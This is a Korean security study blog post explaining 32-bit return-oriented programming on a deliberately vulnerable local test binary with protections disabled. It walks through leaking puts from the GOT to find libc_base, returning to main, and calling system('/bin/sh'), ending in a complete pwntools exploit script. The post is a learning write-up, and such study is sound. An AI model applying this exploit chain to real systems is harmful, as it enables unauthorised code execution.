---
title: "[PWNABLE] ROP_32bit"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ ROP에 대해서는 앞에서 몇번 언급을 한 적이 있다. Return-Oriented Programming 으로 gadget을 이용하여 함수들을 새로 구성하여 수행하는 공격으로메모리 보호기법 중 하나인 ASLR을 우회하기 위한 기법이다. ROP는 32비"
date: "2023-12-01"
translation_key: "tistory-a06ebd940643"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-ROP32bit"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. **※**** 

ROP에 대해서는 앞에서 몇번 언급을 한 적이 있다. 

Return-Oriented Programming 으로 gadget을 이용하여 함수들을 새로 구성하여 수행하는 공격으로

메모리 보호기법 중 하나인 ASLR을 우회하기 위한 기법이다.

ROP는 32비트와 64비트 환경에서의 공격 방법에 약간의 차이가 발생한다.

32비트는 스택을 이용하지만 64비트는 레지스터와 스택을 이용하는 함수 호출 규약 때문이다.

먼저 32비트 ROP에 대해 다뤄보겠다.

```
#include <stdio.h>

int main(){
	char input[0x50];
	puts("Hello! Whrd ");

	read(0,input,0x100);
	return 0 ;
}
```

이전에 보았었던 매우 간단한 예제이다.

공격을 수행하는 과정은 RTL-Chaining과 유사하다.

차이점은 ROP는 ASLR을 우회하기 위해 libc\_base의 주소를 구한다.

공격 시나리오를 간단하게 살펴보자면

1\. libc\_base 구하기

2\. 공격 수행하기

이 2가지 과정을 여러 방식으로 수행하게 되는 것이다.

다시 본론으로 돌아와 위 예제를 살펴보겠다.

![](/assets/images/tistory/tistory-a06ebd940643/001.png)

32비트 컴파일 환경이며 보호기법은 모두 꺼져있다.

그렇다면 공격을 수행하기 위해 canary를 leak하거나 기타 작업을 할 필요가 없다는 뜻이 된다.

libc\_base를 구할려면 어떻게 해야할까??

정답은 got가 가리키고 있는 함수의 실제 주소를 출력 시키는 것이다.

마침 예제 코드에서는 출력함수인 puts가 들어있다.

해당 함수를 이용한다면 공격 수행이 가능하다.

이때 가젯을 사용해야 하는데 32비트는 앞서 말했듯이 스택만을 이용하여 인자를 전달한다.

즉, pop-ret 가젯을 사용하는 것에 있어서 어떤 가젯을 사용하더라도 공격이 가능하다는 것이다.

![](/assets/images/tistory/tistory-a06ebd940643/002.png)

버퍼의 크기는 0x54이며 여기에 sfp를 더하면 총 0x58의 더미를 입력해주어야 한다.

이제 chain을 구성해보겠다.

앞서 말했듯이 스택을 통해 인자를 전달한다.

func가 먼저 실행이 되고 인자수에 맞게 가젯이 들어간다.

이후 스택에 들어갈 값을 입력하게 된다면 

인자가 func로 전달되고 가젯에 의해 스택에서 제외되게 된다.

```
payload = b'A'*0x54
payload += b'B'*0x4

payload += p32(puts_plt)
payload += p32(pr)
payload += p32(puts_got)
```

위와 같이 구성할 수 있다.

이제부터는 각 사람마다 방식이 달라지게 된다.

여기서 바로 p.recv로 값을 받아 계산하여 공격을 수행하는 방법이 있고,

main함수로 돌아가서 수행하는 ret to main 방식이 있다.

개인적으로 main함수로 돌아가는 방식을 많이 사용하기 때문에 해당 방법으로 설명하겠다.

위의 코드를 통해 puts의 실제 주소를 구했다면 이후는 어떻게 해야할까??

puts함수의 offset을 구하여 libc\_base를 계산해주어야 한다.

```
puts_got = e.got['puts']
puts_plt = e.plt['puts']
main = e.sym['main']

ret = 0x0804900e
pr = 0x08049196

payload = b'A'*0x54
payload += b'B'*0x4

payload += p32(puts_plt)
payload += p32(pr)
payload += p32(puts_got)

payload += p32(main)

pause()
p.sendafter(b'Whrd', payload)

p.recvn(2)
libc_base = u32(p.recvn(4)) - libc.sym['puts']
print('libc_base = ',hex(libc_base))
```

코드를 먼저 보여주면 위와 같다.

libc파일에는 모든 함수들의 offset이 들어있다.

![](/assets/images/tistory/tistory-a06ebd940643/003.png)

여기서 libc 파일은 /lib/i386-linux-gnu/libc.so.6 이다.

해당 파일을 확인해보면

![](/assets/images/tistory/tistory-a06ebd940643/004.png)

주소가 아니라 offset 형식으로 들어있는 것을 볼 수 있다.

코드를 보면 알 수 있듯이 leak한 puts의 실제 주소에 offset을 빼면 libc\_base를 구할 수 있다.

구한 코드들을 바탕으로 system('/bin/sh\\x00'); 을 구성하면 된다.

여기서도 방법이 나뉘는데 bss 영역을 이용하거나 문자열의 주소 자체를 구하는 방법이 있다.

후자의 방법을 다루겠다.

```
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'A'*0x54
payload += b'B'*0x4

payload += p32(system)
payload += p32(pr)
payload += p32(binsh)

p.sendafter(b'Whrd', payload)
```

전체 페이로드는 다음과 같다.

```
from pwn import *

p = process('./rop32')
e = ELF('./rop32')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

##############################################

puts_got = e.got['puts']
puts_plt = e.plt['puts']
main = e.sym['main']

ret = 0x0804900e
pr = 0x08049196

############### stage 1 : libc_base###########

payload = b'A'*0x54
payload += b'B'*0x4

payload += p32(puts_plt)
payload += p32(pr)
payload += p32(puts_got)

payload += p32(main)

pause()
p.sendafter(b'Whrd', payload)

p.recvn(2)
libc_base = u32(p.recvn(4)) - libc.sym['puts']
print('libc_base = ',hex(libc_base))

############### stage 2 : attack   ###########

system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'A'*0x54
payload += b'B'*0x4

payload += p32(system)
payload += p32(pr)
payload += p32(binsh)

p.sendafter(b'Whrd', payload)

p.interactive()
```
